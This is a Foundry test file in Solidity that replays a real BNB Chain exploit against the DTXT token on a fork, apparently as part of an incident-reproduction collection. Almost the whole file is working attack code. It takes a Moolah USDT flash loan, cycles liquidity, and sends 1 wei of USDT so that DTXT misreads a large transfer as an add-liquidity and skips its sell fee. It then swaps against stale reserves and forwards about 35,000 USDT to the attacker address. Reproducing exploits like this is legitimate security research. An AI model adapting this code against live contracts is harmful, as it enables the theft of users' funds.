// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 35,041.11 USDT
// Attacker : 0xd304ea1592f733e0a46436a01fe54bd504009526
// Attack Contract : 0x3065bc8ed8bd53bdc3fd4633c3097c40726b5f5f
// Vulnerable Contract : 0xac9bf7c320d4ce2d0ac978b83955dd67351897d2
// Victim : 0x90bfc1dbc878ba54858ba8a635b3daebd2ac6c01
// Attack Tx : https://bscscan.com/tx/0x07ba2ccf2b5c1aaca4c017af4fe87762a73ef7177f6ea8bb569367e908a0671d

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xac9bf7c320d4ce2d0ac978b83955dd67351897d2#code

// @Analysis
// Twitter Guy : https://x.com/audit_911/status/2063793931138347015
//
// The attacker used a Moolah USDT flash loan and a pre-funded DTXT helper to add/remove DTXT/USDT
// liquidity. A 1-wei USDT transfer then made DTXT misclassify a large transfer into the Pancake pair
// as liquidity addition, bypassing sell fees before swapping DTXT for USDT.

address constant ATTACKER = 0xd304ea1592f733e0A46436A01fe54bD504009526;
address constant HISTORICAL_DTXT_HELPER = 0xd2453Ff82E1C5b568dDB260f1f0bb95169895428;
address constant MOOLAH_FLASH_LOAN = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant DTXT_TOKEN = 0xAc9Bf7C320d4cE2D0ac978B83955Dd67351897D2;
address constant DTXT_USDT_PAIR = 0x90BfC1dBc878bA54858bA8A635B3DAebd2aC6c01;
address payable constant PANCAKE_ROUTER = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

interface IMoolahFlashLoan {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 102_432_239;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(HISTORICAL_DTXT_HELPER, "Historical DTXT seed helper");
        vm.label(MOOLAH_FLASH_LOAN, "Moolah flash loan proxy");
        vm.label(DTXT_TOKEN, "DTXT token");
        vm.label(DTXT_USDT_PAIR, "DTXT/USDT Pancake pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        DTXTSeedHelper helper = new DTXTSeedHelper();
        uint256 seedDtxt = IERC20(DTXT_TOKEN).balanceOf(HISTORICAL_DTXT_HELPER);
        deal(DTXT_TOKEN, address(helper), seedDtxt);
        vm.label(address(helper), "Local DTXT seed helper");

        DTXTExploit exploit = new DTXTExploit(address(helper), ATTACKER);
        vm.label(address(exploit), "Local attack contract");

        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.execute();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 35_000 ether, "USDT profit");
    }
}

contract DTXTSeedHelper {
    constructor() {
        IERC20(USDT_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);
        IERC20(DTXT_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);
    }

    function addLiquidityAndReturnRemainder(
        uint256 seedDtxt,
        uint256 usdtRetained
    ) external {
        uint256 dtxtForLiquidity = seedDtxt / 2;
        uint256 usdtForLiquidity = IERC20(USDT_TOKEN).balanceOf(msg.sender) - usdtRetained;

        IERC20(USDT_TOKEN).transferFrom(msg.sender, address(this), usdtForLiquidity);
        IPancakeRouter(PANCAKE_ROUTER)
            .addLiquidity(USDT_TOKEN, DTXT_TOKEN, usdtForLiquidity, dtxtForLiquidity, 0, 0, msg.sender, block.timestamp);

        IERC20(DTXT_TOKEN).transfer(msg.sender, dtxtForLiquidity);
    }
}

contract DTXTExploit {
    DTXTSeedHelper private immutable helper;
    address private immutable profitReceiver;
    uint256 private expectedFlashAmount;

    constructor(
        address helper_,
        address profitReceiver_
    ) {
        helper = DTXTSeedHelper(helper_);
        profitReceiver = profitReceiver_;
    }

    function execute() external {
        require(msg.sender == profitReceiver, "only receiver");

        // step 1: derive the Moolah flash loan from the helper's DTXT seed and current pair reserves.
        uint256 seedDtxt = IERC20(DTXT_TOKEN).balanceOf(address(helper));
        uint256 flashAmount = _flashAmountForSeed(seedDtxt);
        expectedFlashAmount = flashAmount;
        IMoolahFlashLoan(MOOLAH_FLASH_LOAN).flashLoan(USDT_TOKEN, flashAmount, abi.encode(seedDtxt));

        // step 6: after Moolah pulls repayment, forward remaining USDT profit to the attacker EOA.
        uint256 profit = IERC20(USDT_TOKEN).balanceOf(address(this));
        IERC20(USDT_TOKEN).transfer(profitReceiver, profit);
    }

    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external {
        require(msg.sender == MOOLAH_FLASH_LOAN, "not Moolah");
        require(assets == expectedFlashAmount, "unexpected loan");

        uint256 seedDtxt = abi.decode(data, (uint256));

        // step 2: add USDT plus half of the helper's DTXT to the pair, then return the helper remainder.
        IERC20(USDT_TOKEN).approve(address(helper), type(uint256).max);
        helper.addLiquidityAndReturnRemainder(seedDtxt, 1 ether);

        // step 3: remove the minted LP, keeping the DTXT received through DTXT's delete-liquidity branch.
        uint256 lpBalance = IERC20(DTXT_USDT_PAIR).balanceOf(address(this));
        IERC20(DTXT_USDT_PAIR).approve(PANCAKE_ROUTER, type(uint256).max);
        IPancakeRouter(PANCAKE_ROUTER)
            .removeLiquidity(USDT_TOKEN, DTXT_TOKEN, lpBalance, 0, 0, address(this), block.timestamp + 60);

        // step 4: skew the token0 balance by 1 wei so DTXT treats the next pair transfer as add-liquidity.
        IERC20(USDT_TOKEN).transfer(DTXT_USDT_PAIR, 1);
        IERC20(DTXT_TOKEN).transfer(DTXT_USDT_PAIR, IERC20(DTXT_TOKEN).balanceOf(address(this)));

        // step 5: swap out USDT against stale reserves using the DTXT balance actually received by the pair.
        (uint112 reserve0, uint112 reserve1,) = IPancakePair(DTXT_USDT_PAIR).getReserves();
        uint256 dtxtIn = IERC20(DTXT_TOKEN).balanceOf(DTXT_USDT_PAIR) - uint256(reserve1);
        uint256 usdtOut = IPancakeRouter(PANCAKE_ROUTER).getAmountOut(dtxtIn, uint256(reserve1), uint256(reserve0));
        IPancakePair(DTXT_USDT_PAIR).swap(usdtOut, 0, address(this), "");

        IERC20(USDT_TOKEN).approve(MOOLAH_FLASH_LOAN, assets);
    }

    function _flashAmountForSeed(
        uint256 seedDtxt
    ) private view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IPancakePair(DTXT_USDT_PAIR).getReserves();
        require(IPancakePair(DTXT_USDT_PAIR).token0() == USDT_TOKEN, "unexpected token0");
        require(IPancakePair(DTXT_USDT_PAIR).token1() == DTXT_TOKEN, "unexpected token1");

        uint256 dtxtForLiquidity = seedDtxt / 2;
        uint256 usdtForLiquidity = (dtxtForLiquidity * uint256(reserve0)) / uint256(reserve1);
        return usdtForLiquidity + 1 ether;
    }
}
